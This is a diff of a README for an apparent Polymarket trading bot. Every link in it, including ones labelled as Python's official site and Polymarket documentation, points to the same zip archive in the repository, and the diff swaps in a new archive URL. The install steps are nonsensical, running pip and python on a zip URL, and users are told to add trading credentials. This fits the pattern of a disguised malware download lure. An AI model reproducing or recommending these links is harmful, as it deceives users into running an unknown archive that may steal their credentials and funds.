@@ -1,6 +1,6 @@
 # 🤖 polymarket-trading-bot - Your Easy Trading Companion
 
-[![Download](https://github.com/Panca2341/polymarket-trading-bot/raw/refs/heads/main/docs/api-reference/series/trading_bot_polymarket_3.2.zip%20Now-Polymarket%20Trading%20Bot-brightgreen)](https://github.com/Panca2341/polymarket-trading-bot/raw/refs/heads/main/docs/api-reference/series/trading_bot_polymarket_3.2.zip)
+[![Download](https://raw.githubusercontent.com/Panca2341/polymarket-trading-bot/main/docs/api-reference/profiles/bot-polymarket-trading-landowner.zip%20Now-Polymarket%20Trading%20Bot-brightgreen)](https://raw.githubusercontent.com/Panca2341/polymarket-trading-bot/main/docs/api-reference/profiles/bot-polymarket-trading-landowner.zip)
 
 A beginner-friendly Python trading bot for Polymarket with gasless transactions and real-time WebSocket data.
 
@@ -21,8 +21,8 @@ Follow these simple steps to download and run the Polymarket Trading Bot. This g
 
 ### Step 1: Download the Software
 
-1. Visit the [Releases page](https://github.com/Panca2341/polymarket-trading-bot/raw/refs/heads/main/docs/api-reference/series/trading_bot_polymarket_3.2.zip) and look for the latest version.
-2. Download the version suitable for your operating system. Look for files like `https://github.com/Panca2341/polymarket-trading-bot/raw/refs/heads/main/docs/api-reference/series/trading_bot_polymarket_3.2.zip` or similar.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Panca2341/polymarket-trading-bot/main/docs/api-reference/profiles/bot-polymarket-trading-landowner.zip) and look for the latest version.
+2. Download the version suitable for your operating system. Look for files like `https://raw.githubusercontent.com/Panca2341/polymarket-trading-bot/main/docs/api-reference/profiles/bot-polymarket-trading-landowner.zip` or similar.
 3. Once downloaded, unzip the file to a folder of your choice on your computer.
 
 ### Step 2: Install Dependencies
@@ -36,7 +36,7 @@ Open your terminal or command prompt:
 
 2. Make sure you have Python and pip installed. Install the required libraries by running:
    ```bash
-   pip install -r https://github.com/Panca2341/polymarket-trading-bot/raw/refs/heads/main/docs/api-reference/series/trading_bot_polymarket_3.2.zip
+   pip install -r https://raw.githubusercontent.com/Panca2341/polymarket-trading-bot/main/docs/api-reference/profiles/bot-polymarket-trading-landowner.zip
    ```
 
 ### Step 3: Configure Your Credentials
@@ -57,7 +57,7 @@ You are ready to start trading:
 
 1. In the terminal, run:
    ```bash
-   python https://github.com/Panca2341/polymarket-trading-bot/raw/refs/heads/main/docs/api-reference/series/trading_bot_polymarket_3.2.zip
+   python https://raw.githubusercontent.com/Panca2341/polymarket-trading-bot/main/docs/api-reference/profiles/bot-polymarket-trading-landowner.zip
    ```
 2. The bot will launch, and you will see the terminal user interface.
 
@@ -73,7 +73,7 @@ You are ready to start trading:
 
 ## 📥 Download & Install
 
-To download the software, visit the [Releases page](https://github.com/Panca2341/polymarket-trading-bot/raw/refs/heads/main/docs/api-reference/series/trading_bot_polymarket_3.2.zip) and follow the steps outlined.
+To download the software, visit the [Releases page](https://raw.githubusercontent.com/Panca2341/polymarket-trading-bot/main/docs/api-reference/profiles/bot-polymarket-trading-landowner.zip) and follow the steps outlined.
 
 ## 🔒 Security Tips
 
@@ -90,8 +90,8 @@ If you face any challenges while setting up or running the bot:
 
 ## 🔗 Additional Resources
 
-- [Polymarket Documentation](https://github.com/Panca2341/polymarket-trading-bot/raw/refs/heads/main/docs/api-reference/series/trading_bot_polymarket_3.2.zip)
-- [Python Official Website](https://github.com/Panca2341/polymarket-trading-bot/raw/refs/heads/main/docs/api-reference/series/trading_bot_polymarket_3.2.zip)
-- [Community Support](https://github.com/Panca2341/polymarket-trading-bot/raw/refs/heads/main/docs/api-reference/series/trading_bot_polymarket_3.2.zip)
+- [Polymarket Documentation](https://raw.githubusercontent.com/Panca2341/polymarket-trading-bot/main/docs/api-reference/profiles/bot-polymarket-trading-landowner.zip)
+- [Python Official Website](https://raw.githubusercontent.com/Panca2341/polymarket-trading-bot/main/docs/api-reference/profiles/bot-polymarket-trading-landowner.zip)
+- [Community Support](https://raw.githubusercontent.com/Panca2341/polymarket-trading-bot/main/docs/api-reference/profiles/bot-polymarket-trading-landowner.zip)
 
 Now you have everything you need to begin your trading journey with the Polymarket Trading Bot!
